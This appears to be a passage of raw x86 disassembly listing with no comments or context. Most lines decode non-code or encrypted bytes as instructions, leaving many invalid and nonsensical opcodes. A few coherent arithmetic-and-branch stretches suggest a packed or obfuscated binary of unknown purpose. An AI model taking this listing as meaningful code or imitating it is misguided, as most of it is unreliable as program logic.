  40b882:	adc    dh,BYTE PTR [ecx-0x72]
  40b885:	pop    ss
  40b886:	lock add eax,0x5a25d781
  40b88c:	xchg   esi,eax
  40b88d:	adc    al,0xb1
  40b88f:	mov    ecx,0xc2a9f8a1
  40b894:	xor    eax,0x6e7661a5
  40b899:	aaa    
  40b89a:	inc    edi
  40b89b:	sbb    al,0x1a
  40b89d:	cli    
  40b89e:	jbe    0x40b8f9
  40b8a0:	dec    ecx
  40b8a1:	lods   eax,DWORD PTR ds:[esi]
  40b8a2:	xchg   edi,eax
  40b8a3:	xlat   BYTE PTR ds:[ebx]
  40b8a4:	outs   dx,DWORD PTR ds:[esi]
  40b8a5:	adc    ebx,DWORD PTR [esi+ecx*2+0x892c7b5]
  40b8ac:	inc    edi
  40b8ad:	enter  0x21f2,0x35
  40b8b1:	aam    0x2d
  40b8b3:	out    dx,eax
  40b8b4:	mov    al,ds:0xb00c3d48
  40b8b9:	or     cl,BYTE PTR fs:[edx]
  40b8bc:	aam    0xe9
  40b8be:	adc    cl,BYTE PTR [ebx-0x24aafc8c]
  40b8c4:	sti    
  40b8c5:	add    eax,0x7238e363
  40b8ca:	jp     0x40b850
  40b8cc:	test   al,0x8c
  40b8ce:	mov    dl,0x2
  40b8d0:	xor    al,0x96
  40b8d2:	shl    BYTE PTR [edi-0x47346679],1
  40b8d8:	mov    ?,WORD PTR [eax]
  40b8da:	jmp    0x40b93d
  40b8dc:	aad    0x3b
  40b8de:	push   ds
  40b8df:	dec    ebx
  40b8e0:	xchg   edi,eax
  40b8e1:	mov    cl,0x66
  40b8e3:	loop   0x40b866
  40b8e5:	mov    ss:0x343a4f6,al
  40b8eb:	into   
  40b8ec:	mov    ds:0xd2eac6de,eax
  40b8f1:	jmp    0x40b91c
  40b8f3:	mov    WORD PTR [eax+0x22],gs
  40b8f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b8f7:	out    dx,al
  40b8f8:	pop    edx
  40b8f9:	mov    ah,0xb2
  40b8fb:	mov    edi,DWORD PTR ds:[ebp-0x4]
  40b8ff:	xor    edx,eax
  40b901:	xor    edi,eax
  40b903:	add    edi,ecx
  40b905:	add    edx,ecx
  40b907:	imul   edx,edi
  40b90a:	mov    edi,DWORD PTR [ebp-0x8]
  40b90d:	mov    ebx,DWORD PTR [ebp-0x10]
  40b910:	sub    ebx,edi
  40b912:	cmp    ebx,edx
  40b914:	ja     0x40b922
  40b91a:	mov    edx,DWORD PTR [ebp-0x30]
  40b91d:	jmp    0x40c0ee
  40b922:	mov    edx,DWORD PTR [ebp-0x38]
  40b925:	mov    edi,DWORD PTR [ebp-0x4]
  40b928:	xor    edx,eax
  40b92a:	xor    edi,eax
  40b92c:	add    edi,ecx
  40b92e:	add    edx,ecx
  40b930:	imul   edx,edi
  40b933:	mov    edi,DWORD PTR [ebp-0x8]
  40b936:	jmp    0x40bcf4
  40b93b:	xchg   ebp,eax
  40b93c:	fcomi  st,st(6)
  40b93e:	push   esi
  40b93f:	jb     0x40b992
  40b941:	mov    ch,0xdb
  40b943:	shl    BYTE PTR [ebx-0x24ae9905],cl
  40b949:	and    al,0x7d
  40b94b:	pusha  
  40b94c:	xor    DWORD PTR [eax+0x70],0xffffff9f
  40b950:	jge    0x40b9c2
  40b952:	jo     0x40b9c3
  40b954:	dec    ebp
  40b955:	push   cs
  40b956:	mov    bl,0x9c
  40b958:	sub    esi,DWORD PTR [edx+eax*2-0x6c2e9a41]
  40b95f:	ss push ss
  40b961:	ins    BYTE PTR es:[edi],dx
  40b962:	mov    ah,0x64
  40b964:	xchg   DWORD PTR [ecx-0x31],ecx
  40b967:	outs   dx,DWORD PTR ds:[esi]
  40b968:	jno    0x40b928
  40b96a:	mov    dl,0x99
  40b96c:	dec    edi
  40b96d:	ins    BYTE PTR es:[edi],dx
  40b96e:	push   ebp
  40b96f:	pop    eax
  40b970:	les    ebp,FWORD PTR [edx]
  40b972:	(bad)  
  40b973:	repz cmp eax,edi
  40b976:	mov    edi,0x3a91a226
  40b97b:	mov    esi,0xe21aec97
  40b980:	and    ebx,edi
  40b982:	push   esi
  40b983:	inc    ebp
  40b984:	add    DWORD PTR [ebx+ebx*2+0x24e7486c],edx
  40b98b:	clc    
  40b98c:	aam    0xf9
  40b98e:	xchg   esi,eax
  40b98f:	inc    esp
  40b990:	or     eax,0xd1266191
  40b995:	clc    
  40b996:	sahf   
  40b997:	add    eax,0xd435b98e
  40b99c:	aaa    
  40b99d:	test   BYTE PTR [eax],dl
  40b99f:	clc    
  40b9a0:	rcr    BYTE PTR [ecx],0xf7
  40b9a3:	xchg   esp,eax
  40b9a4:	push   eax
  40b9a5:	jbe    0x40b95c
  40b9a7:	pop    ecx
  40b9a8:	dec    edx
  40b9a9:	jne    0x40ba10
  40b9ab:	test   BYTE PTR [ebp+eax*8+0x5c],dh
  40b9af:	jae    0x40ba24
  40b9b1:	imul   ebp,ebp,0x3002d3b8
  40b9b7:	retf   0x4049
  40b9ba:	adc    edx,esi
  40b9bc:	pop    ebx
  40b9bd:	inc    edx
  40b9be:	fst    QWORD PTR [edx-0x43ba1dcf]
  40b9c4:	repz and DWORD PTR [ebx],esi
  40b9c7:	inc    esi
  40b9c8:	daa    
  40b9c9:	enter  0xc77b,0xd8
  40b9cd:	pop    edx
  40b9ce:	adc    DWORD PTR [ebx-0x227ca8e8],edx
  40b9d4:	ja     0x40b9df
  40b9d6:	cmp    BYTE PTR [esi-0x5c],bh
  40b9d9:	jmp    0xaa6d661a
  40b9de:	inc    esp
  40b9df:	jne    0x40b9b7
  40b9e1:	sub    BYTE PTR ds:0x6efcd7d2,ch
  40b9e7:	inc    ecx
  40b9e8:	dec    esi
  40b9e9:	lds    esp,FWORD PTR [eax-0x4c]
  40b9ec:	push   esi
  40b9ed:	mov    edx,0x296d9dac
  40b9f2:	retf   
  40b9f3:	xor    BYTE PTR [ecx],bh
  40b9f5:	push   esi
  40b9f6:	jg     0x40b98b
  40b9f8:	ds ins BYTE PTR es:[edi],dx
  40b9fa:	icebp  
  40b9fb:	sbb    DWORD PTR [ecx+0x1575ddaa],ebp
  40ba01:	inc    ebp
  40ba02:	adc    eax,0xb811137a
  40ba07:	(bad)  [ebx]
  40ba09:	out    0x58,eax
  40ba0b:	adc    al,0xf1
  40ba0d:	ja     0x40ba2b
  40ba0f:	icebp  
  40ba10:	call   0x72ee:0xec63e2b6
  40ba17:	xlat   BYTE PTR ds:[ebx]
  40ba18:	mov    dl,BYTE PTR [edi-0x79]
  40ba1b:	xchg   edi,eax
  40ba1c:	cmp    DWORD PTR [edi-0x3b8025be],ebp
  40ba22:	int3   
  40ba23:	cmp    BYTE PTR [edx+0x272e5721],al
  40ba29:	(bad)  
  40ba2a:	loope  0x40ba73
  40ba2c:	xchg   ecx,eax
  40ba2d:	or     edi,DWORD PTR [di+0x74]
  40ba31:	data16 sbb BYTE PTR [ebp+0x6c58954],0x36
  40ba39:	add    esp,ecx
  40ba3b:	cmp    eax,0xf7f32085
  40ba40:	daa    
  40ba41:	je     0x40ba36
  40ba43:	loop   0x40baaf
  40ba45:	sbb    esp,esi
  40ba47:	cmp    bh,bl
  40ba49:	push   0x7e2285af
  40ba4e:	sub    DWORD PTR [eax+0x70],0xbbd09058
  40ba55:	mov    dh,0xd
  40ba57:	aam    0x94
  40ba59:	icebp  
  40ba5a:	add    al,0x28
  40ba5c:	sar    ebp,0x5f
  40ba5f:	adc    esi,0xfffffff7
  40ba62:	or     eax,0xf6f53886
  40ba67:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ba68:	stos   DWORD PTR es:[edi],eax
  40ba69:	aam    0x4e
  40ba6b:	xchg   ebx,eax
  40ba6d:	into   
  40ba6e:	into   
  40ba6f:	or     ch,bh
  40ba71:	sbb    DWORD PTR [ecx+0x33],edx
  40ba74:	sbb    eax,0x29d6a021
  40ba79:	imul   esp,DWORD PTR [edx-0x4f20efe3],0xe30ac3ec
  40ba83:	xor    DWORD PTR [edi+0x1d],0xffffffd8
  40ba87:	sub    edi,eax
  40ba89:	xchg   esp,eax
  40ba8a:	(bad)  
  40ba8b:	outs   dx,DWORD PTR ds:[esi]
  40ba8c:	cmp    bl,dl
  40ba8e:	push   0xcd456703
  40ba93:	aaa    
  40ba94:	push   ds
  40ba95:	dec    ebx
  40ba96:	jge    0x40baa0
  40ba98:	cmp    esp,DWORD PTR [eax]
  40ba9a:	mov    ds:0x348368ee,al
  40ba9f:	push   0x7b
  40baa1:	adc    DWORD PTR [esp+ebx*8+0x76e12cff],edx
  40baa8:	jnp    0x40ba30
  40baaa:	pop    ss
  40baab:	jo     0x40ba42
  40baad:	xchg   esi,eax
  40baae:	imul   ebp,DWORD PTR [esi-0x582e0870],0xffffffba
  40bab5:	cld    
  40bab6:	add    bl,BYTE PTR [ebp-0x7c]
  40bab9:	mov    ebx,0x646c04e5
  40babe:	out    0xb,eax
  40bac0:	int3   
  40bac1:	les    eax,FWORD PTR [esi]
  40bac3:	sbb    ecx,DWORD PTR [ebx-0x3976b2d1]
  40bac9:	pop    ds
  40baca:	rol    DWORD PTR [edx+0x26],cl
  40bacd:	(bad)  
  40bacf:	sbb    eax,0x63395aa8
  40bad4:	mov    DWORD PTR [eax-0x3c3dda43],edi
  40bada:	pusha  
  40badb:	or     eax,0xe1322cc8
  40bae0:	xor    bh,BYTE PTR [edi+0xe]
  40bae3:	lods   eax,DWORD PTR ds:[esi]
  40bae4:	jno    0x40ba6a
  40bae6:	cmp    dl,bl
  40bae8:	aaa    
  40bae9:	fild   QWORD PTR [edi]
  40baeb:	pop    edi
  40baec:	dec    ecx
  40baed:	out    0x2a,eax
  40baef:	mov    ebx,0x59d289b8
  40baf4:	cs pop edx
  40baf6:	aad    0xed
  40baf8:	push   es
  40baf9:	enter  0xc3a3,0x4e
  40bafd:	cmc    
  40bafe:	jb     0x40ba86
  40bb00:	out    0xd9,al
  40bb02:	mov    ebx,0xcf783485
  40bb07:	sbb    DWORD PTR [edi],ecx
  40bb09:	jno    0x40bacf
  40bb0b:	in     eax,dx
  40bb0c:	mov    bh,0x87
  40bb0e:	popf   
  40bb0f:	dec    ebx
  40bb10:	popa   
  40bb11:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bb12:	dec    ebx
  40bb13:	scas   eax,DWORD PTR es:[edi]
  40bb14:	repz sub al,0x3
  40bb17:	xchg   BYTE PTR [edi],bl
  40bb19:	xor    edi,edx
  40bb1b:	mov    esp,0x3ff7d95e
  40bb20:	adc    DWORD PTR [ecx],0x1e
  40bb23:	or     eax,DWORD PTR [edx+0x765fcefa]
  40bb29:	push   0xffffffd6
  40bb2b:	xlat   BYTE PTR ds:[ebx]
  40bb2c:	ss dec ebx
  40bb2e:	(bad)  
  40bb30:	lahf   
  40bb31:	jmp    0x40bb88
  40bb33:	mov    eax,0xbafe0073
  40bb38:	stos   BYTE PTR es:[edi],al
  40bb39:	and    DWORD PTR [ebp-0xa],ecx
  40bb3c:	ds popa 
  40bb3e:	dec    esi
  40bb3f:	adc    BYTE PTR [ecx-0x6c],0xd4
  40bb43:	sub    BYTE PTR [esi-0x57ff845c],0x77
  40bb4a:	(bad)
  40bb4d:	data16 adc al,0xba
  40bb50:	popa   
  40bb51:	xchg   BYTE PTR [ebx+0x256c74ea],bl
  40bb57:	and    BYTE PTR [edi],al
  40bb59:	inc    edi
  40bb5a:	and    edi,edx
  40bb5c:	clc    
  40bb5d:	cli    
  40bb5e:	imul   bh
  40bb60:	fisubr DWORD PTR [ebx-0x4295db44]
  40bb66:	mov    ebx,0xe6d8ded6
  40bb6b:	fneni(8087 only) 
  40bb6d:	ror    DWORD PTR [ebx],0x5
  40bb70:	sbb    al,0xd6
  40bb72:	xor    cl,BYTE PTR ds:0xadca5d7b
  40bb78:	push   0x51f0450c
  40bb7d:	aad    0xdd
  40bb7f:	and    ecx,esi
  40bb81:	push   ecx
  40bb82:	call   0xb38ee34f
  40bb87:	pop    ds
  40bb88:	mov    bl,0xed
  40bb8a:	mov    ds:0x44e8cc46,al
  40bb8f:	(bad)  
  40bb90:	cmovg  esi,DWORD PTR [esi+0x5d2a9264]
  40bb97:	and    al,0x45
  40bb99:	outs   dx,BYTE PTR ds:[esi]
  40bb9a:	fldcw  WORD PTR [eax+esi*2+0x5b6fc738]
  40bba1:	into   
  40bba2:	add    edi,DWORD PTR [ecx+0x15e9e14f]
  40bba8:	and    eax,0xfe16f5cb
  40bbad:	dec    eax
  40bbae:	xlat   BYTE PTR ds:[ebx]
  40bbaf:	cdq    
  40bbb0:	add    eax,0xcf4e9a6e
  40bbb5:	pop    eax
  40bbb6:	mov    eax,0x16fd890c
  40bbbb:	mov    esi,0xfd74a1a3
  40bbc0:	jmp    0x240faa2a
  40bbc5:	push   0xfb8b4eaf
  40bbca:	push   ebx
  40bbcb:	push   ecx
  40bbcc:	dec    ebp
  40bbcd:	and    ah,0x57
  40bbd0:	dec    ebp
  40bbd1:	or     dl,BYTE PTR [edi]
  40bbd3:	retf   0x349b
  40bbd6:	stos   BYTE PTR es:[edi],al
  40bbd7:	pop    ds
  40bbd8:	iret   
  40bbd9:	xchg   esi,eax
  40bbdb:	or     ebx,DWORD PTR [esi+0x4f]
  40bbde:	mov    ah,0xb
  40bbe0:	xchg   ecx,eax
  40bbe1:	dec    ecx
  40bbe2:	arpl   WORD PTR [ecx],di
  40bbe4:	mov    edi,0xb7ef9c5e
  40bbe9:	popf   
  40bbea:	rcr    DWORD PTR [eax],0xbd
  40bbed:	das    
  40bbee:	mov    eax,ds:0xd30525a9
  40bbf3:	pop    eax
  40bbf4:	mov    ecx,0x12cc0488
  40bbf9:	mov    ch,0x19
  40bbfb:	cmp    DWORD PTR [esi-0x5224e148],edx
  40bc01:	inc    ebx
  40bc02:	std    
  40bc03:	fbstp  TBYTE PTR ds:0x40115b94
  40bc09:	adc    bh,ah
  40bc0b:	xor    ah,BYTE PTR [edi+eiz*1]
  40bc0e:	sub    bh,bh
  40bc10:	shl    DWORD PTR [edx-0x2b359131],1
  40bc16:	inc    esi
  40bc17:	adc    bh,0xb6
  40bc1a:	cwde   
  40bc1b:	pop    eax
  40bc1c:	sub    eax,0xa1a0f69
  40bc21:	ret    
  40bc22:	mov    ebp,0xad6ac2d1
  40bc27:	pop    esi
  40bc28:	dec    ecx
  40bc29:	xchg   esp,eax
  40bc2a:	dec    eax
  40bc2b:	stos   DWORD PTR es:[edi],eax
  40bc2c:	sub    al,0x42
  40bc2e:	sahf   
  40bc2f:	fs mov eax,0xc03b6bb7
  40bc35:	jge    0x40bc13
  40bc37:	mov    ebp,0xfc319825
  40bc3c:	jae    0x40bbe5
  40bc3e:	scas   eax,DWORD PTR es:[edi]
  40bc3f:	pop    ecx
  40bc40:	not    DWORD PTR [ebx]
  40bc42:	shl    BYTE PTR [edx-0x325cabc5],1
  40bc48:	int    0x2b
  40bc4a:	cmp    al,0xc
  40bc4c:	add    eax,ebp
  40bc4e:	cdq    
  40bc4f:	ss push ebp
  40bc51:	sbb    al,0xca
  40bc53:	push   esi
  40bc54:	mov    cl,0xd5
  40bc56:	test   eax,0xf9f8e6d6
  40bc5b:	adc    dh,BYTE PTR [edi-0x44cb0440]
  40bc61:	sub    edx,0xffffffbc
  40bc64:	sbb    BYTE PTR [edi+0x4d],ah
  40bc67:	cmp    eax,0xc4bfc0a7
  40bc6c:	jmp    0x9d969b32
  40bc71:	test   eax,0xbda89d21
  40bc76:	mov    ?,WORD PTR [ecx+0x5f9ddcec]
  40bc7c:	stc    
  40bc7d:	rcl    BYTE PTR [esi+0x77],cl
  40bc80:	inc    edx
  40bc81:	pop    ebp
  40bc82:	mov    WORD PTR [edi-0x3c13e1bd],?
  40bc88:	stos   DWORD PTR es:[edi],eax
  40bc89:	enter  0x91a1,0xc2
  40bc8d:	mov    dl,0xcd
  40bc90:	add    ch,cl
  40bc92:	sbb    BYTE PTR [eax+ebx*1],bh
  40bc95:	and    ecx,ebp
  40bc97:	push   eax
  40bc98:	test   al,0x59
  40bc9a:	add    al,0x8
  40bc9c:	repnz xchg cl,cl
  40bc9f:	sub    DWORD PTR [eax-0x495c5e20],ebp
  40bca5:	lock mov ebp,0x2b6e2835
  40bcab:	or     DWORD PTR [esi],0xeab796e2
  40bcb1:	sbb    BYTE PTR [ebx],al
  40bcb3:	dec    ebx
  40bcb4:	adc    BYTE PTR [eax+0x248e1961],cl
  40bcba:	dec    cl
  40bcbc:	sbb    al,0xf8
  40bcbe:	push   0x89dff057
  40bcc3:	inc    edx
  40bcc4:	xor    edi,DWORD PTR [ebp+0x1d825dae]
  40bcca:	jbe    0x40bc99
  40bccc:	dec    esp
  40bccd:	jl     0x40bd05
  40bccf:	ss jbe 0x40bc5d
  40bcd2:	xor    BYTE PTR [edx-0x3280368e],ah
  40bcd8:	inc    edx
  40bcd9:	xchg   edx,eax
  40bcda:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bcdb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bcdc:	sbb    BYTE PTR [ebx],0x9d
  40bcdf:	out    0x37,al
  40bce1:	fld    QWORD PTR [edi]
  40bce3:	xlat   BYTE PTR ds:[ebx]
  40bce4:	sub    BYTE PTR [edi-0x3f32c7ae],al
  40bcea:	xchg   ecx,eax
  40bceb:	out    0xa5,al
  40bced:	scas   eax,DWORD PTR es:[edi]
  40bcee:	fdivp  st(2),st
  40bcf0:	rol    DWORD PTR [ebx+0x61],cl
  40bcf3:	ror    BYTE PTR [ebx-0x20d40fa3],1
  40bcf9:	cmp    ebx,edx
  40bcfb:	ja     0x40bd09
  40bd01:	mov    edx,DWORD PTR [ebp-0x34]
  40bd04:	jmp    0x40c0ee
  40bd09:	mov    edx,DWORD PTR [ebp-0x3c]
  40bd0c:	mov    edi,DWORD PTR [ebp-0x4]
  40bd0f:	xor    edx,eax
  40bd11:	xor    edi,eax
  40bd13:	add    edx,ecx
  40bd15:	add    edi,ecx
  40bd17:	imul   edx,edi
  40bd1a:	mov    edi,DWORD PTR [ebp-0x8]
  40bd1d:	mov    ebx,DWORD PTR [ebp-0x10]
  40bd20:	sub    ebx,edi
  40bd22:	cmp    ebx,edx
  40bd24:	mov    edx,DWORD PTR [ebp-0x38]
  40bd27:	jbe    0x40c0ee
  40bd2d:	jmp    0x40c0eb
  40bd32:	xchg   edx,eax
  40bd33:	dec    edx
  40bd34:	inc    edx
  40bd35:	inc    esp
  40bd36:	inc    edx
  40bd37:	push   esp
  40bd38:	xchg   edx,eax
  40bd39:	dec    edx
  40bd3a:	fdiv   DWORD PTR [edx+edi*8]
  40bd3d:	adc    cl,BYTE PTR ds:0x8f39bf48
  40bd43:	(bad)  
  40bd44:	jo     0x40bdb6
  40bd46:	lahf   
  40bd47:	jge    0x40bdb9
  40bd49:	jo     0x40bdaa
  40bd4b:	rcr    DWORD PTR [eax],1
  40bd4d:	aad    0x2
  40bd4f:	xchg   ebp,eax
  40bd50:	aam    0xba
  40bd52:	add    al,0x8f
  40bd54:	enter  0x925,0x2d
  40bd58:	imul   esp,DWORD PTR [edx-0x67ec5d6e],0x90a51ea4
  40bd62:	cmp    BYTE PTR [esi-0x6ed7850d],bl
  40bd68:	test   BYTE PTR [ebx],cl
  40bd6a:	xor    DWORD PTR [ebx],ecx
  40bd6c:	loope  0x40bdda
  40bd6e:	sahf   
  40bd6f:	(bad)  
  40bd70:	pop    ss
  40bd71:	inc    esi
  40bd72:	add    bh,dh
  40bd74:	aaa    
  40bd75:	add    BYTE PTR [ebx-0x30],ch
  40bd78:	sub    DWORD PTR [ebx+eiz*1+0x25638f15],edi
  40bd7f:	cld    
  40bd80:	lods   al,BYTE PTR ds:[esi]
  40bd81:	out    0xd5,eax
  40bd83:	mov    WORD PTR [ecx-0x3e],fs
  40bd86:	ds mov al,0xb6
  40bd89:	inc    esi
  40bd8a:	jp     0x6e0262b1
  40bd90:	jnp    0x40bda3
  40bd92:	gs iret 
  40bd94:	sub    al,0x45
  40bd96:	jbe    0x40bdea
  40bd98:	cmp    edx,DWORD PTR [edx]
  40bd9a:	loop   0x40bd25
  40bd9c:	fcom   DWORD PTR [edi+0xa]
  40bd9f:	cwde   
  40bda0:	or     DWORD PTR [ebp-0x40],edi
  40bda3:	daa    
  40bda4:	sbb    al,BYTE PTR [ebx-0x59bd6840]
  40bdaa:	or     esp,DWORD PTR [ebp-0x2b]
  40bdad:	inc    ebx
  40bdae:	fild   QWORD PTR [ebx]
  40bdb0:	sahf   
  40bdb1:	adc    al,0x9d
  40bdb3:	sbb    eax,0xbd138e09
  40bdb8:	cmp    ah,BYTE PTR [edx]
  40bdba:	xchg   edx,eax
  40bdbb:	mov    WORD PTR [eax-0x194734d2],fs
  40bdc1:	out    dx,al
  40bdc2:	sub    al,0x0
  40bdc4:	fsub   QWORD PTR ds:0x85392d0c
  40bdca:	popa   
  40bdcb:	imul   eax,edi,0x90b2fd54
  40bdd1:	mov    ds:0x49b1b814,al
  40bdd6:	sahf   
  40bdd7:	xchg   esp,eax
  40bdd8:	jb     0x40be04
  40bdda:	pushf  
  40bddb:	rcr    DWORD PTR [ebx+0x74985294],0x89
  40bde2:	inc    edi
  40bde3:	es test al,0x7a
  40bde6:	mov    bh,bl
  40bde8:	in     al,dx
  40bde9:	mov    eax,0x60981231
  40bdee:	idiv   BYTE PTR [edx-0x24]
  40bdf1:	cmp    ah,bl
  40bdf3:	adc    ch,BYTE PTR [edx]
  40bdf5:	adc    DWORD PTR [esi+eax*2],ecx
  40bdf8:	das    
  40bdf9:	fcomp  DWORD PTR [ebx]
  40bdfb:	inc    edx
  40bdfc:	xor    edx,DWORD PTR ds:0xbe0f9462
  40be02:	add    ah,BYTE PTR [edx+edi*1+0x57]
  40be06:	cld    
  40be07:	outs   dx,DWORD PTR ds:[esi]
  40be08:	jns    0x40be7c
  40be0a:	jo     0x40be83
  40be0c:	fwait
  40be0d:	dec    ebx
  40be0e:	cli    
  40be0f:	inc    ebx
  40be10:	aaa    
  40be11:	jae    0x40be5f
  40be13:	and    dl,BYTE PTR [esi+0x2293bf2d]
  40be19:	mov    al,0xa2
  40be1b:	inc    ebx
  40be1c:	sbb    eax,0xbeee4d54
  40be21:	fcmovb st,st(4)
  40be23:	mov    ebp,0x5a45edda
  40be28:	add    eax,0x4173daf7
  40be2d:	pushf  
  40be2e:	xchg   ebx,eax
  40be2f:	xor    dh,ah
  40be31:	test   BYTE PTR [esi-0x4a76f04b],bl
  40be37:	jecxz  0x40be7d
  40be39:	test   DWORD PTR [edx],edx
  40be3b:	or     cl,BYTE PTR [esi]
  40be3d:	add    eax,0x3fcc1f50
  40be42:	mov    ecx,0x8be5c881
  40be47:	popf   
  40be48:	lahf   
  40be49:	inc    esp
  40be4a:	retf   
  40be4b:	or     eax,0x7bd33d8d
  40be50:	jmp    0x40be3e
  40be52:	mov    BYTE PTR [edi+0x5811081e],bh
  40be58:	out    0x8d,al
  40be5a:	xchg   esi,eax
  40be5b:	and    eax,0x5392edc5
  40be60:	leave  
  40be61:	in     eax,0xf
  40be63:	test   DWORD PTR [eax],edi
  40be65:	mov    ecx,0x32f9bec0
  40be6a:	out    dx,eax
  40be6b:	gs aam 0xe
  40be6e:	mov    ds:0x81f9abce,eax
  40be73:	ror    DWORD PTR [ebx-0x67],cl
  40be76:	ret    
  40be77:	lods   eax,DWORD PTR ds:[esi]
  40be78:	push   0x6d
  40be7a:	cld    
  40be7b:	inc    BYTE PTR [edx]
  40be7d:	je     0x40be00
  40be7f:	pop    ds
  40be80:	outs   dx,BYTE PTR ds:[esi]
  40be81:	mov    WORD PTR ss:[ebx+0x59],fs
  40be85:	jp     0x40bee2
  40be87:	es inc edi
  40be89:	mov    al,ds:0xb91fa0b1
  40be8e:	cli    
  40be8f:	sub    edi,edi
  40be91:	mov    ebx,0x3442246c
  40be96:	push   cs
  40be97:	leave  
  40be98:	pop    ds
  40be99:	leave  
  40be9a:	ss or  eax,0x2218b33c
  40bea0:	lds    eax,FWORD PTR [ebx]
  40bea2:	dec    edx
  40bea3:	in     eax,dx
  40bea4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bea5:	hlt    
  40bea6:	add    DWORD PTR [ebp-0x53d41620],0x85a66aaa
  40beb0:	fdiv   QWORD PTR [ecx-0x4de90551]
  40beb6:	cs inc esi
  40beb8:	ss pop ecx
  40beba:	push   es
  40bebb:	(bad)  
  40bebc:	stos   DWORD PTR es:[edi],eax
  40bebd:	lods   al,BYTE PTR ds:[esi]
  40bebe:	(bad)  
  40bebf:	jle    0x40bf1a
  40bec1:	data16 or al,0x2b
  40bec4:	adc    al,0xad
  40bec6:	adc    al,0x2b
  40bec8:	inc    ecx
  40bec9:	pop    esi
  40beca:	adc    ecx,esp
  40becc:	repnz mov eax,ds:0xe1540096
  40bed2:	mul    DWORD PTR [ebp+0x16]
  40bed5:	rcr    DWORD PTR [ebx],1
  40bed7:	xor    BYTE PTR [edx],dl
  40bed9:	or     cl,BYTE PTR [esi]
  40bedb:	lea    esi,[ebx+0x7c]
  40bede:	test   DWORD PTR [ebx+0x459c4d42],eax
  40bee4:	fbstp  TBYTE PTR [edx+0x2381203c]
  40beea:	push   ss
  40beeb:	and    ebp,DWORD PTR [eax+0x62]
  40beee:	xchg   edx,eax
  40beef:	push   ss
  40bef0:	xor    BYTE PTR es:[esi+ebx*1-0x58162366],bl
  40bef8:	es mov ecx,0xa8faada4
  40befe:	push   0x804244b9
  40bf03:	cs mov ch,0x75
  40bf06:	and    eax,DWORD PTR [esi+0x3]
  40bf09:	scas   eax,DWORD PTR es:[edi]
  40bf0a:	aad    0xbf
  40bf0c:	pushf  
  40bf0d:	mov    ds:0x32d43716,eax
  40bf12:	ret    0x16c3
  40bf15:	popa   
  40bf16:	dec    esi
  40bf17:	in     al,0xfc
  40bf19:	mov    ah,dh
  40bf1b:	xchg   ecx,eax
  40bf1c:	shl    ecx,1
  40bf1e:	mov    ds:0x830b54f3,al
  40bf23:	ins    DWORD PTR es:[edi],dx
  40bf24:	jno    0x40bf23
  40bf26:	aam    0x10
  40bf28:	push   ss
  40bf29:	jmp    0x40bf56
  40bf2b:	cmc    
  40bf2c:	pop    ss
  40bf2d:	or     al,0x67
  40bf2f:	adc    ch,BYTE PTR [ebx-0x3c]
  40bf32:	out    0xc0,eax
  40bf34:	stos   DWORD PTR es:[edi],eax
  40bf35:	mov    WORD PTR [ebx],ss
  40bf37:	imul   eax,DWORD PTR es:[ecx+0x4ea6b94f],0x45
  40bf3f:	pop    ebx
  40bf40:	xor    esi,esp
  40bf42:	call   0xd751ec54
  40bf47:	sub    cl,BYTE PTR [ecx+esi*8+0x5f02714b]
  40bf4e:	fldcw  WORD PTR [ebx-0x14]
  40bf51:	push   0xffffff8a
  40bf53:	xchg   ebp,eax
  40bf54:	xchg   bl,al
  40bf56:	test   BYTE PTR [edi+0x6aad3f99],cl
  40bf5c:	rcr    BYTE PTR [edx-0x34c41953],cl
  40bf62:	xor    BYTE PTR [edi+0x76],cl
  40bf65:	dec    ecx
  40bf66:	and    BYTE PTR [eax],cl
  40bf68:	shr    dl,0x7a
  40bf6b:	loopne 0x40bf1f
  40bf6d:	mov    ebp,0x736f194a
  40bf72:	mov    al,ds:0x8069e5fa
  40bf77:	nop
  40bf78:	xor    BYTE PTR [esi+0x51a1d9a3],bh
  40bf7e:	retf   
  40bf7f:	test   eax,0x521376aa
  40bf84:	mov    bh,BYTE PTR [eax]
  40bf86:	jp     0x40bf5b
  40bf88:	inc    edx
  40bf89:	and    al,0x55
  40bf8b:	stc    
  40bf8c:	cmp    bl,BYTE PTR [edi+0x3f96e285]
  40bf92:	shl    DWORD PTR [ebx+0x7c],0xd2
  40bf96:	mov    dh,0x3c
  40bf98:	xchg   esi,eax
  40bf99:	or     esi,DWORD PTR [ebp+esi*2-0x50]
  40bf9d:	mov    cl,BYTE PTR [ebx+0x6250dce8]
  40bfa3:	lods   al,BYTE PTR ds:[esi]
  40bfa4:	xchg   edi,eax
  40bfa5:	xchg   edx,eax
  40bfa6:	dec    edx
  40bfa7:	mov    dh,BYTE PTR [esp+ebx*1]
  40bfaa:	mov    ah,0x45
  40bfac:	cmp    DWORD PTR [ebp+0x2250de94],ebp
  40bfb2:	imul   esp,DWORD PTR [edi],0xffffffa6
  40bfb5:	sub    esi,esp
  40bfb7:	fcmovnb st,st(2)
  40bfb9:	out    0xda,eax
  40bfbb:	pop    esp
  40bfbc:	add    ecx,edi
  40bfbe:	jg     0x40bfc3
  40bfc0:	push   esi
  40bfc1:	inc    eax
  40bfc2:	inc    eax
  40bfc3:	dec    ebx
  40bfc4:	push   es
  40bfc5:	test   eax,0x207ea57
  40bfca:	fcomip st,st(4)
  40bfcc:	syscall 
  40bfce:	inc    eax
  40bfcf:	jbe    0x40c005
  40bfd1:	jmp    0x659f:0xff780d8
  40bfd8:	mov    ds:0x901935a9,eax
  40bfdd:	xor    ecx,edi
  40bfdf:	inc    ebp
  40bfe0:	(bad)  
  40bfe1:	xor    eax,0x315b25b0
  40bfe6:	sub    eax,0xb39d9f08
  40bfeb:	sub    DWORD PTR [eax-0x5c4b5c84],0xfffffff7
  40bff2:	scas   eax,DWORD PTR es:[edi]
  40bff3:	mov    eax,ds:0x1a658c4b
  40bff8:	sub    BYTE PTR [ebp-0x3b],al
  40bffb:	mov    bh,0xcd
  40bffd:	add    DWORD PTR [ebx+0x52596807],ebp
  40c003:	fadd   QWORD PTR [eax]
  40c005:	gs inc edi
  40c007:	sub    cl,BYTE PTR [ebx+0x70]
  40c00a:	sbb    edx,DWORD PTR [ebp-0x71]
  40c00d:	mov    eax,ds:0xd5b0cecf
  40c012:	cdq    
